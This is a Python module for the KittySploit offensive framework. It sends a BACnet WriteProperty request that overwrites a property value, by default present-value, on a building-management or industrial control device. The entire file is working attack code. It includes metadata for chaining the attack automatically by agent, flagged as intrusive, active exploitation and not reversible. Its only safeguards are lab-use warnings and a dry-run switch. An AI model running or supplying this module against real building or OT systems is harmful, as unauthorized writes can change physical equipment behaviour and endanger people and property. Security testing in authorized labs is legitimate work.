#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.ics.bacnet_client import write_property
from lib.protocols.ics.constants import ICS_PROTOCOL_PORTS
from lib.protocols.ics.ics_scanner_client import Ics_scanner_client


class Module(Post, Ics_scanner_client):
    __info__ = {
        "name": "BACnet write property",
        "description": "Sends a BACnet WriteProperty request (intrusive — BMS/OT lab only)",
        "author": "KittySploit Team",
        "tags": ["ics", "bacnet", "bms", "write"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['active_exploitation'],
        'expected_requests': 2,
        'reversible': False,
        'approval_required': True,
        'produces': ['risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': ['ot_assets', 'modbus_tcp', 's7comm', 'dnp3_access'],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    port = OptPort(ICS_PROTOCOL_PORTS["bacnet"], "BACnet/IP UDP port", True)
    device_id = OptInteger(1, "BACnet device instance", True)
    object_type = OptInteger(2, "BACnet object type (e.g. 2=AV)", True)
    object_instance = OptInteger(1, "Object instance", True)
    property_id = OptInteger(85, "Property identifier (85=present-value)", True)
    value = OptInteger(0, "Integer value to write", True)
    dry_run = OptBool(False, "Build request only — do not send", False)

    def check(self):
        return bool(self._host())

    def run(self):
        host = self._host()
        if not host:
            print_error("Target is required")
            return False
        payload = bytes([0x21, int(self.value) & 0xFF])
        if bool(self.dry_run):
            print_success(
                f"Dry run — would WriteProperty dev={self.device_id} "
                f"obj={self.object_type}:{self.object_instance} prop={self.property_id}"
            )
            return True
        print_warning("Sending BACnet WriteProperty — authorized lab use only")
        response = write_property(
            host,
            int(self.device_id),
            int(self.object_type),
            int(self.object_instance),
            int(self.property_id),
            payload,
            self._port(),
            self._timeout(),
        )
        if response:
            print_success(f"WriteProperty response received ({len(response)} bytes)")
            return True
        print_error("No BACnet response")
        return False
